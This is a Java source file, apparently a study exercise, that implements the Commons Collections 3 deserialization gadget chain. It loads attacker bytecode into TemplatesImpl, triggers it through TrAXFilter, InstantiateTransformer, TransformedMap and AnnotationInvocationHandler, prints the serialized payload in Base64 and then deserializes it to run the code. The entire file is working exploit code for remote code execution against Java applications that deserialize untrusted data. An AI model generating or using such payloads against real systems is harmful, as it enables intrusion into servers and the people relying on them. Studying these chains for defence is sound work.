import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.tracing.dtrace.Attributes;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        //创建TemplatesImpl对象加载字节码
        byte[] code = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_name", "RoboTerh");
        setFieldValue(obj, "_class", null);
        //setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(obj, "_bytecodes", new byte[][]{code});

        //创建 ChainedTransformer实例
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj}),
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        //创建TransformedMap 实例
        HashMap innermap = new HashMap();
        innermap.put("name", "RoboTerh");
        Map outmap = TransformedMap.decorate(innermap, null, chain);

        //创建readObject 入口
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Attributes.class, outmap);

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(handler);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}